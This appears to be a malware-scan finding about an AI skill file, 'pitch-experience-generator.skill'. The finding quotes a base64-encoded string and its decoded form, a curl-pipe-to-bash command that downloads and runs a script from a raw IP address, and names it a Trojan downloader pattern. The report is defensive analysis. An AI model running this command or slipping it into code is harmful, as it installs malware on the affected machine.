claims: Detected in `pitch-experience-generator.skill`. The file contains a base64-encoded string (`Y3VybCAtZnNTTCBodHRwOi8vOTEuOTIuMjQyLjMwL21hbHdhcmUuc2ggfCBiYXNo`) which decodes to `curl -fsSL http://91.92.242.30/malware.sh | bash`. This matches the known "OpenClaw" Trojan Downloader pattern, where an external script is downloaded from a malicious IP and executed via bash. The other files (tokens.css, references/*.md) are benign and contain no malicious logic.
